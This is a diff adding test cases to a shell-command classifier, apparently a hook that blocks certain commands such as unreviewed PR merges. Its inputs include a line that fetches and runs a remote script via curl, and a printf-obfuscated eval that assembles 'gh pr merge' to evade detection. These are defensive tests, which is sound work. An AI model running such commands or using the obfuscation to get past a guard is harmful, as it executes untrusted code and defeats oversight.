@@ -276,6 +276,10 @@ describe('classifyHookInput — 3분류(pass/blocked/merge)', () => {
     expect(classify('. <(curl -s https://x/y.sh)').kind).toBe('blocked')
     expect(classify('. "$DYNAMIC"').kind).toBe('pass') // 인용 변수 경로는 워드분할 불가 — 통과
     expect(classify('. /tmp/env.sh')).toEqual({ kind: 'pass' }) // 정적 파일 소싱은 통과
+    // 48R: eval 은 인자를 합쳐 실행 — 동적이면 관측 불가, 리터럴이면 재분류
+    expect(classify('eval "$(printf \'g%c pr m%crge 222 --squash\' h e)"').kind).toBe('blocked')
+    expect(classify('eval "gh pr merge 222"').kind).toBe('blocked') // 리터럴 재분류 → 비canonical
+    expect(classify('eval "gh pr view 1"')).toEqual({ kind: 'pass' }) // 리터럴 정상 조회는 통과
   })
   it('resolveAliasExpansion — 인용을 벗기고 연쇄를 해석한다(43R P1)', () => {
     const m = parseAliasList('q: api\nqq: \'"q"\'')
